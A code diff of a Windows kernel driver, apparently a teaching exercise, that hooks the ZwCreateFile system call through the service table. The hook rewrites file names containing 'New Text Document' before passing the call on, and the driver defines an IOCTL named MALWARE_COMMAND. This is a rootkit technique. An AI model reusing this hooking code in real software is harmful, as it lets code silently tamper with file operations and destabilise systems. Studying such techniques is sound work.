@@ -4,11 +4,14 @@
 #include <defines.h>
 #include <intrin.h>
 #include <ntifs.h>
+#include <ntdef.h> // For WCHAR
+
 
 #define SUGIOT2 0x8001
 #define IOCTL_SUGIOT1_MALWARE_COMMAND CTL_CODE(SUGIOT2, 0x800, METHOD_NEITHER, FILE_ANY_ACCESS)
 #define DRIVER_TAG 'MICH'
 #define HookFuncName "ZwCreateFile"
+#define MAX_PATH 260
 
 typedef NTSTATUS(*PZwCreateFile)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK, PLARGE_INTEGER, ULONG, ULONG, ULONG, ULONG, PVOID, ULONG);
 
@@ -17,7 +20,7 @@ PZwCreateFile oldZwCreateFile = NULL;
 PVOID FindPattern(PCUCHAR pattern, UCHAR wildcard, ULONG_PTR len, const PVOID base, ULONG_PTR size, PULONG foundIndex, ULONG relativeOffset) {
 	bool found;
 
-	if (pattern == NULL || base == NULL || len == 0 || size == 0)
+	if (pattern == NULL || base == NULL || len == 0 || size == 0 || (len > size))
 		return NULL;
 
 	for (ULONG_PTR i = 0; i < size - len; i++) {
@@ -242,34 +245,21 @@ NTSTATUS CreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp)
 
 NTSTATUS ZwCreateFileHook(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, PLARGE_INTEGER AllocationSize, ULONG FileAttributes, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength)
 {
-	UNICODE_STRING kObjectName;
-	kObjectName.Buffer = NULL;
-	if ((ObjectAttributes != NULL) && (ObjectAttributes->ObjectName != NULL))
-	{
-		kObjectName.Length = ObjectAttributes->ObjectName->Length;
-		kObjectName.MaximumLength = ObjectAttributes->ObjectName->MaximumLength;
-		kObjectName.Buffer = ExAllocatePoolWithTag(PagedPool, sizeof(ObjectAttributes->ObjectName));
-		RtlCopyUnicodeString(&kObjectName, ObjectAttributes->ObjectName);
+	// check objectAttributes and Object name arent nulls
+	if (!((ObjectAttributes != NULL) && (ObjectAttributes->ObjectName != NULL) && (ObjectAttributes->ObjectName->Length < 256)))
+		return oldZwCreateFile(FileHandle, DesiredAccess, ObjectAttributes, IoStatusBlock, AllocationSize, FileAttributes, ShareAccess, CreateDisposition, CreateOptions, EaBuffer, EaLength);
 
-		wchar_t fileName[256];
-		for (int i = 0; i < ObjectAttributes->ObjectName->Length; i++)
-		{
-			fileName[i] = ObjectAttributes->ObjectName->Buffer[i];
-		}
-		DbgPrint("%ws\n", fileName);
-		if (wcscmp(fileName, L"\\??\\C:\\Users\\ISE\\Desktop\\Sugiot2.txt") == 0)
-		{
-			wchar_t fileNameAfter[256] = L"\\??\\C:\\Users\\ISE\\Desktop\\Hooked.txt";
-			for (int i = 0; i < ObjectAttributes->ObjectName->Length; i++)
-			{
-				ObjectAttributes->ObjectName->Buffer[i] = fileNameAfter[i];
-			}
-			DbgPrint("Replaced\n");
-		}
-		
-	}
-	DbgPrint("Hooked!\n");
+	PCWCHAR targetName = L"New Text Document";
+	SIZE_T targetNameLength = wcslen(targetName) * 2; // all the functions are designed for chars so we need to x2
+	
+	// check if it our our target file name
+	PVOID indexToName = FindPattern((PCUCHAR)targetName, '_', targetNameLength, ObjectAttributes->ObjectName->Buffer, ObjectAttributes->ObjectName->Length, NULL, NULL);
+
+	if (indexToName)
+		memcpy(indexToName, L"Sugiot2 ssdt hook", targetNameLength);
+
 	return oldZwCreateFile(FileHandle, DesiredAccess, ObjectAttributes, IoStatusBlock, AllocationSize, FileAttributes, ShareAccess, CreateDisposition, CreateOptions, EaBuffer, EaLength);
+	
 }
 
 void SugiotUnload(_In_ PDRIVER_OBJECT DriverObject)
